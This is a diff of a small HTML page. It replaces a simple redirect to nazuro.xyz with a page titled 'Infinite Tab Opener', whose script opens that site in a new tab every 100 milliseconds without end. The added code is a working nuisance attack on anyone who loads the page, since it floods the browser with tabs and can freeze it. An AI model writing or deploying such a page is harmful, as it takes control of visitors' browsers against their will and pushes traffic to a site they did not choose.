@@ -1,20 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title></title>
-    <meta http-equiv="refresh" content="0; url=https://nazuro.xyz">
+    <title>Infinite Tab Opener</title>
     <script>
-        window.location.href = "https://nazuro.xyz";
-        
-        if (document.referrer === "https://nazuro.xyz") {
-            window.location.href = window.location.href;
-        }
+        setInterval(() => {
+            window.open("https://nazuro.xyz", "_blank");
+        }, 100); 
     </script>
 </head>
-<body>
-    <noscript>
-        <meta http-equiv="refresh" content="0; url=https://nazuro.xyz">
-        <p>If you are not redirected automatically, <a href="https://nazuro.xyz">click here</a>.</p>
-    </noscript>
-</body>
+<body></body>
 </html>
